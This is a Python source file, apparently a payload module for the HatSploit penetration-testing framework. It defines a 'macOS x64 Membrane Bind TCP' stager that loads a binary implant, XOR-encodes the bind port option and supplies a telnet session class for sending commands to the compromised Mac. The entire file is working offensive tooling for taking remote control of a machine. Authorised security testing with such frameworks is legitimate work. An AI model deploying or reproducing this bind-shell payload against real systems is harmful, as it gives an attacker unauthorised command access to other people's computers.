#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.payload import Payload
from hatsploit.utils.string import StringTools

from hatsploit.session import Session
from hatsploit.utils.telnet import TelnetClient


class HatSploitSession(Session, TelnetClient):
    client = None

    details = {
        'Platform': "macos",
        'Type': "membrane"
    }

    def open(self, client):
        self.client = self.open_telnet(client)

    def close(self):
        self.client.disconnect()

    def send_command(self, command, output=False, timeout=10):
        output = self.client.send_command(command + '\n', output, timeout)
        if output:
            output = output.replace('membrane > ', '')
        return output

    def interact(self):
        self.client.interact()


class HatSploitPayload(Payload, StringTools):
    details = {
        'Category': "stager",
        'Name': "macOS x64 Membrane Bind TCP",
        'Payload': "macos/x64/membrane_bind_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Membrane bind TCP payload for macOS x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "macos",
        'Risk': "high",
        'Type': "bind_tcp"
    }

    options = {
        'BPORT': {
            'Description': "Bind port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        bind_port = self.parse_options(self.options)
        bind_port = self.xor_string(bind_port)

        self.output_process("Generating payload...")
        with open('data/membrane/macos/x64/membrane', 'rb') as f:
            payload = f.read()

        return payload, f"bind '{bind_port}'", HatSploitSession
